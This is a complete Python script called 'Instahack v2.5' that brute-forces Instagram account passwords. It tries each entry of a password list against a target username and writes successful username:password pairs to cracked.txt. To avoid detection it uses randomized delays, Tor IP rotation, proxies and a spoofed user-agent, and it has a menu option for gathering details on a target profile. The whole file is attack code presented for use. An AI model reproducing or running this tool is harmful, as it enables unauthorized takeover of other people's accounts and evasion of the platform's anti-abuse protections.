#!/usr/bin/env python3
import os, sys, time, subprocess, random
from instagrapi import Client
from stem.control import Controller
from colorama import Fore, Style, init

init(autoreset=True)

SMART_ANTIBAN_ENABLED = True
CUSTOM_PROXY = None
CUSTOM_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"
SESSIONID = None

def banner():
    print(Fore.CYAN + "="*60)
    print(Fore.YELLOW + "🛡️ Instahack v2.5 – Smart Anti-Block Engine (Color Edition)")
    print(Fore.CYAN + "="*60)

def change_ip():
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate(password='your_password')
            controller.signal('newnym')
        print(Fore.GREEN + "[✓] New Tor IP acquired.")
    except Exception as e:
        print(Fore.RED + f"[!] Tor IP rotation failed: {e}")

def set_proxy():
    global CUSTOM_PROXY
    proxy = input(Fore.CYAN + "Enter proxy (e.g. http://user:pass@ip:port): ").strip()
    CUSTOM_PROXY = proxy
    print(Fore.GREEN + "[✓] Proxy set.")

def set_user_agent():
    global CUSTOM_UA
    ua = input(Fore.CYAN + "Enter custom User-Agent string: ").strip()
    if ua:
        CUSTOM_UA = ua
        print(Fore.GREEN + "[✓] User-Agent updated.")

def set_session_id():
    global SESSIONID
    sid = input(Fore.CYAN + "Enter your Instagram sessionid: ").strip()
    SESSIONID = sid
    print(Fore.GREEN + "[✓] SessionID set. Will be used instead of login.")

def login_client():
    client = Client()
    if CUSTOM_PROXY:
        client.set_proxy(CUSTOM_PROXY)
    client.set_user_agent(CUSTOM_UA)
    if SESSIONID:
        try:
            client.login_by_sessionid(SESSIONID)
            print(Fore.GREEN + "[✓] SessionID login successful.")
        except Exception as e:
            print(Fore.RED + f"[!] SessionID login failed: {e}")
    return client

def gather_osint():
    username = input(Fore.YELLOW + "Target username: ")
    try:
        client = login_client()
        user = client.user_info_by_username(username)
        print(Fore.GREEN + f"Username: {user.username}")
        print(f"Full name: {user.full_name}")
        print(f"Public: {'Yes' if not user.is_private else 'No'}")
        print(f"Followers: {user.follower_count}, Following: {user.following_count}")
    except Exception as e:
        print(Fore.RED + f"[!] Failed to gather OSINT: {e}")

def load_passwords(path):
    if not os.path.exists(path):
        print(Fore.RED + "[!] Password file not found.")
        return []
    with open(path) as f:
        return [line.strip() for line in f if line.strip()]

def try_login(client, username, password):
    try:
        client.login(username, password)
        return True, None
    except Exception as e:
        return False, str(e)

def attack(username, passwords):
    delay = 3
    client = login_client()

    for pwd in passwords:
        print(Fore.YELLOW + f"[→] Trying: {pwd}")
        success, error = try_login(client, username, pwd)
        if success:
            print(Fore.GREEN + f"[✔️] Success! Password: {pwd}")
            with open("cracked.txt", "a") as f:
                f.write(f"{username}:{pwd}\n")
            return
        else:
            print(Fore.RED + f"[✘] Failed: {error}")
            if SMART_ANTIBAN_ENABLED:
                sleep = random.randint(delay, delay + 5)
                print(Fore.BLUE + f"[~] Sleeping {sleep}s to evade ban...")
                time.sleep(sleep)

def auto_attack():
    username = input("Target username: ")
    passwords = load_passwords("password_list.txt")
    attack(username, passwords)

def manual_attack():
    username = input("Target username: ")
    path = input("Password list file path: ")
    passwords = load_passwords(path)
    attack(username, passwords)

def toggle_antiban():
    global SMART_ANTIBAN_ENABLED
    SMART_ANTIBAN_ENABLED = not SMART_ANTIBAN_ENABLED
    state = "ON" if SMART_ANTIBAN_ENABLED else "OFF"
    print(Fore.CYAN + f"Smart Anti-Ban is now {state}")

def main():
    banner()
    while True:
        print(Fore.CYAN + "1. Gather OSINT")
        print("2. Auto Attack")
        print("3. Manual Attack")
        print("4. Toggle Smart Anti-Ban")
        print("5. Rotate Tor IP")
        print("6. Set Proxy")
        print("7. Set Custom User-Agent")
        print("8. Set SessionID")
        print("9. Exit")
        choice = input(Fore.YELLOW + "Choose option: ").strip()
        if choice == "1":
            gather_osint()
        elif choice == "2":
            auto_attack()
        elif choice == "3":
            manual_attack()
        elif choice == "4":
            toggle_antiban()
        elif choice == "5":
            change_ip()
        elif choice == "6":
            set_proxy()
        elif choice == "7":
            set_user_agent()
        elif choice == "8":
            set_session_id()
        elif choice == "9":
            break
        else:
            print(Fore.RED + "[!] Invalid choice")

if __name__ == "__main__":
    main()
